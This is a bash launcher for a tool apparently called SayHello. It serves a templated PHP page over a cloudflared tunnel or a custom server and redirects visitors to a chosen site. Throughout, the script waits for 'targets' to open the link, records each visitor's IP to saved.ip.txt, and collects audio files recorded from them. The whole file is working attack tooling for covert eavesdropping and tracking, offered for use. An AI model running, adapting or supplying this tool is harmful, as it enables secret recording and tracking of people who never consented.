#!/bin/bash
# SayHello v1.0

trap 'printf "\n";stop' 2

null_redir="> /dev/null 2>&1"
verb_xterm=""
if [[ $# -eq 1 ]]; then
  null_redir=""
  verb_xterm="xterm -e"
fi

banner() {
clear
printf "\e[1;92m                                           __  \e[0m\n"
printf "\e[1;93m  ____              _   _      _ _       \e[0m\e[1;92m /__\   \e[0m  M\n"
printf "\e[1;93m / ___|  __ _ _   _| | | | ___| | | ___  \e[0m\e[1;92m \__/   \e[0m  A\n"
printf "\e[1;93m \___ \ / _\ | | | | |_| |/ _ \ | |/ _ \ \e[0m\e[1;92m  ||    \e[0m  H\n"
printf "\e[1;93m  ___) | (_| | |_| |  _  |  __/ | | (_) |\e[0m\e[1;92m  ||    \e[0m  A\n"
printf "\e[1;93m |____/ \__,_|\__, |_| |_|\___|_|_|\___/ \e[0m\e[1;92m  ||    \e[0m  D\n"
printf "\e[1;93m              |___/                      \e[0m\e[1;92m   \__  \e[0m  E\n"
printf "\e[1;92m                                               \ \e[0m  B\n"

printf "\e[1;92m\e[0m\e[1;77mv2.0\e[0m\e[1;92m\e[1;96m Credit by https://youtube.com/@zerodarknexus\e[0m \n"
}

stop() {
checkphp=$(ps aux | grep -o "php" | head -n1)
checkcloudflared=$(ps aux | grep -o "cloudflared" | head -n1)
if [[ $checkphp == *'php'* ]]; then
eval killall -2 php $null_redir
fi
if [[ $checkcloudflared == *'cloudflared'* ]]; then
eval killall -2 cloudflared $null_redir
fi
exit 1
}

dependencies() {
eval command -v php $null_redir || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
}

catch_ip() {
ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip
cat ip.txt >> saved.ip.txt
}

checkfound() {
printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting targets,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
while [ true ]; do
if [[ -e "ip.txt" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened the link!\n"
catch_ip
rm -rf ip.txt
fi
sleep 0.5
if [[ -e "Log.log" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Audio file received!\e[0m\n"
rm -rf Log.log
fi
sleep 0.5
done
}

cloudflared_server() {
if ! command -v cloudflared &> /dev/null; then
    printf "\e[1;92m[\e[0m+\e[1;92m] Installing Cloudflared...\n"
    if command -v pkg &> /dev/null; then
        pkg install cloudflared -y
    elif command -v apt &> /dev/null; then
        sudo apt install cloudflared -y
    elif command -v yum &> /dev/null; then
        sudo yum install cloudflared -y
    else
        printf "\e[1;93m[!] Could not install Cloudflared automatically. Please install it manually.\e[0m\n"
        exit 1
    fi
fi

printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"
eval php -S 127.0.0.1:3333 $null_redir &
sleep 2
printf "\e[1;92m[\e[0m+\e[1;92m] Starting Cloudflared tunnel...\n"
eval $verb_xterm "cloudflared tunnel -url 127.0.0.1:3333 --logfile cld.log" &
sleep 10

link=$(grep -o 'https://[-a-zA-Z0-9]+\.trycloudflare\.com' cld.log | tail -n1)
printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" $link

sed 's+forwarding_link+'$link'+g' template.php > index.php
sed 's+redirect_link+'$redirect_link'+g' js/_app.js > js/app.js

checkfound
}

custom_server() {
printf "\n\e[1;92m[\e[0m+\e[1;92m] Enter your server URL \e[1;93m( http://localhost:8080 ): \e[0m"
read link
if [[ -z "$link" ]]; then
    printf "\e[1;93m[!] Invalid URL!\e[0m\n"
    return 1
fi

printf "\e[1;92m[\e[0m+\e[1;92m] Enter server port (default: 8080): \e[0m"
read port
port="${port:-8080}"

printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server on port %s...\e[0m\n" $port
eval fuser -k $port/tcp $null_redir
eval php -S localhost:$port $null_redir &

sed 's+forwarding_link+'$link'+g' template.php > index.php
sed 's+redirect_link+'$redirect_link'+g' js/_app.js > js/app.js

printf "\e[1;92m[\e[0m+\e[1;92m] Custom URL set up:\e[0m\e[1;77m %s\e[0m\n" $link
checkfound
}

start1() {
if [[ -e sendlink ]]; then
rm -rf sendlink
fi

printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Cloudflared Tunnel\e[0m\n\n"
printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Custom Server URL\e[0m\n"
default_option_server="1"
read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a Port Forwarding option: \e[0m' option_server
option_server="${option_server:-${default_option_server}}"

default_redirect="https://youtube.com"
printf "\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter your website url \e[1;93m(Default:YouTube.com)\e[1;0m:"
read redirect_link
redirect_link="${redirect_link:-${default_redirect}}"

if [[ $option_server -eq 1 ]]; then
cloudflared_server
elif [[ $option_server -eq 2 ]]; then
custom_server
else
printf "\e[1;93m [!] Invalid option!\e[0m\n"
sleep 1
clear
start1
fi
}

banner
dependencies
start1